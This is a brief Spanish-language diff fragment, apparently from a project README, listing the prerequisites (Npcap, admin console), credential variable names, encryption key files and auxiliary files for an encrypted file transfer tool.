+- Npcap + consola Admin (Windows RAW)
+
+Credenciales/secretos:
+- FTP_USER / FTP_PASS
+- SSH_USER / SSH_PASS
+- MAIL_USER / MAIL_PASS
+- MAIL_TO / MAIL_FROM
+- aes.key (simétrico)
+- rsa_public.pem / rsa_private.pem (asimétrico)
+
+Archivos auxiliares:
+- meta_*.json (metadatos crypto para descifrar en receptor)
+- archivo origen (ej: setup.txt)
+- out_*.bin (salida reconstruida)a
+
